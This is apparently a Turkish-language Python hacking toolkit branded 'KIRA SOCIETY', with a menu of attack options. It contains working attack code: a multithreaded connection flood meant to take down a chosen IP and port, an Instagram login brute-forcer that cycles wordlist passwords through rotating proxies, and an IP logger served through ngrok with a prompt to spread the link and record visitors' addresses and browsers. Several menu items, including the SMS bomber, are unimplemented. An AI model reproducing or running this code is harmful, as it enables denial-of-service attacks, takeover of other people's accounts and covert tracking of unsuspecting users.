import socket
import threading
import requests
import os
import sys
import time
from datetime import datetime
from flask import Flask, request
import pyngrok.ngrok as ngrok
from colorama import Fore, Style, init
import phonenumbers
from phonenumbers import geocoder, carrier
import subprocess

init()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    ascii_art = r'''
        .-"      "-.
       /            \
      |,  .-.  .-.  ,|
      | )(_o/  \o_)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
         `--------`
       ~KIRA SOCIETY~
    '''
    print(Fore.MAGENTA + "Instagram: @0xkirasociety" + Style.RESET_ALL) 
    print(Fore.RED + ascii_art + Style.RESET_ALL)

def start_ip_logger():
    banner()
    print("\033[91mIP Logger Tool Hatalı Olabilir\033[0m")
    
    app = Flask(__name__)
    LOG_FILE = "ip_log.txt"

    @app.route('/')
    def log_ip():
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{current_time}] IP: {client_ip} | User-Agent: {user_agent}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
        return '''<html><head><title>KIRA SOCIETY</title></head><body><h1>Naber Kanka 😎</h1></body></html>'''
    
    domain = input("Domain/URL girin (örn: kiralogger.com): ").strip()
    if not domain:
        domain = "127.0.0.1:5000"
    
    print("\n[1] Localhost (127.0.0.1:5000)")
    print("[2] Ngrok (Public URL)")
    choice = input("Seçim yapın (1/2): ").strip()
    
    if choice == "1":
        print(f"\n[+] IP Logger başlatıldı: http://{domain}")
        app.run(host='0.0.0.0', port=5000)
    elif choice == "2":
        public_url = ngrok.connect(5000, "http")
        print(f"\n[+] IP Logger başlatıldı: {public_url}")
        print(f"[!] Şu linki dağıt: {public_url}")
        app.run(host='0.0.0.0', port=5000)
    else:
        print("Geçersiz seçim!")

def ddos_attack():
    banner()
    print("\033[91mDDoS Toolu İşte Kanki\033[0m")
    target_ip = input("İp Gir: ")
    target_port = int(input("Port Gir: ") or 80)
    packet_count = int(input("Paket Sayısı: ") or 1000)
    thread_count = int(input("Thread Gir : ") or 10)
    attack_running = True
    def attack():
        sent = 0
        while attack_running and sent < packet_count:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                sent += 1
                print(f"[{datetime.now()}] [+] Gönderilen Paket Sayısı: {sent} Paketlerin Gittiği Yer {target_ip}:{target_port}")
                sock.close()
            except Exception as e:
                print(f"[!] Error: {e}")
            time.sleep(0.01)
    print(f"\nSaldırı {target_ip}:{target_port} Üzerinde Başlatılıyor. ")
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nSaldırı Duruyor...")
    print("Bitti.")
    input("Entere Bas Ve Ana Menüye Dön.") 

def brute_force():
    username = input("Instagram kullanıcı adı: ")
    password_file = input("Şifrelerin bulunduğu dosya (örn: passwords.txt): ")
    proxy_file = input("Proxylerin bulunduğu dosya (örn: proxy.txt): ")
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Şifre dosyası bulunamadı!")
        return
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Proxy dosyası bulunamadı!")
        return
    login_url = "https://www.instagram.com/accounts/login/"
    headers = {
        "User-Agent": "Mozilla/5.0",
    }
    for password in passwords:
        proxy_address = proxies[int(time.time()) % len(proxies)] if proxies else None
        current_proxy = {
            'http': f'http://{proxy_address}',
            'https': f'http://{proxy_address}'
        } if proxy_address else None
        try:
            response = requests.post(
                login_url, 
                data={"username": username, "password": password},
                headers=headers,
                proxies=current_proxy,
                timeout=10
            )
            if response.status_code == 200:
                print(f"[+] Denendi: {password}")
            else:
                print(f"[-] Hatalı: {password}")
        except Exception as e:
            print(f"[!] Hata: {e}")
    print("[-] Tüm şifreler denendi.")
    input("Entere Basarak Ana Menüye Dön...")

def sms_bomber():
    print("SMS Bomber özelliği henüz eklenmemiştir.")
    input("Ana menüye dönmek için Enter'a basın.")

def main():
    while True:
        banner()
        print("  " + Fore.YELLOW + "╔════════════════════════╗" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[1] DDoS Attack        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[2] Instagram Hack     " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[3] Port Scanner       " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[4] IP Lookup          " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[5] OSINT Tools        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[6] XSS Scanner        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[7] The Harvester      " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[8] SQLMap             " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[9] SMS Bomber         " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[10] İp Logger         " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL) 
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[0] Exit               " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "╚════════════════════════╝" + Style.RESET_ALL)
        choice = input("Seçim yapın: ").strip()
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            brute_force()
        elif choice == "9":
            sms_bomber()
        elif choice == "10":
            start_ip_logger()
        elif choice == "0":
            print("Çıkış yapılıyor...")
            sys.exit()
        else:
            print("Geçersiz seçim!")
            time.sleep(1)

if __name__ == "__main__":
    main()
